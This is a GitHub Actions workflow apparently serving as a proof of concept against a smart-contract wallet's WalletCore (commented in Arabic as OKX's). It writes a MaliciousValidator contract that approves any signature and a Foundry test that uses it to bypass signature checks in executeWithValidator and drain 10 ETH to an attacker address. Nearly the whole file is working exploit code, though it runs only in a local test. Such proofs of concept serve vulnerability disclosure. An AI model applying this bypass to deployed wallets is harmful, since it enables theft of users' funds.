name: Vulnerability PoC
on: [push]

jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          submodules: recursive

      - name: Install Foundry
        uses: foundry-rs/foundry-toolchain@v1

      - name: Run Exploit
        run: |
          # 1. إنشاء ملف الـ Validator في المجلد الصحيح
          cat > test/MaliciousValidator.sol <<EOF
          // SPDX-License-Identifier: MIT
          pragma solidity ^0.8.23;
          contract MaliciousValidator {
              function validate(bytes32, bytes calldata) external pure returns (bool) { return true; }
              function readAndUpdateNonce(address) external pure returns (uint256) { return 0; }
          }
          EOF

          # 2. إنشاء ملف الـ Exploit مع تصحيح الـ Imports بناءً على هيكلة OKX
          cat > test/ExploitFinal.t.sol <<EOF
          // SPDX-License-Identifier: MIT
          pragma solidity ^0.8.23;
          import "forge-std/Test.sol";
          import "../src/WalletCore.sol";
          import "./MaliciousValidator.sol";
          import "../src/Types.sol";

          contract ExploitFinal is Test {
              WalletCore wallet;
              address attacker = address(0xBAD);

              function setUp() public {
                  // إنشاء المحفظة ووضع رصيد 10 ETH
                  wallet = new WalletCore(address(0x1), "OKX", "1.0.0");
                  vm.deal(address(wallet), 10 ether);
              }

              function testSignatureBypass() public {
                  MaliciousValidator m = new MaliciousValidator();
                  
                  // تجهيز الهجوم لسحب الرصيد
                  Call[] memory c = new Call[](1);
                  c[0] = Call({target: attacker, value: 10 ether, data: ""});
                  
                  // تنفيذ الثغرة: تمرير الـ Validator الخبيث وتوقيع وهمي
                  wallet.executeWithValidator(c, address(m), hex"00");
                  
                  // التأكد من وصول الرصيد للمهاجم
                  assertEq(attacker.balance, 10 ether, "Exploit Failed: Attacker did not receive funds");
                  assertEq(address(wallet).balance, 0, "Exploit Failed: Wallet not drained");
              }
          }
          EOF

          # 3. التشغيل النهائي (بدون --no-compile) مع إظهار تفاصيل الـ Trace
          forge test --match-path test/ExploitFinal.t.sol -vvvv
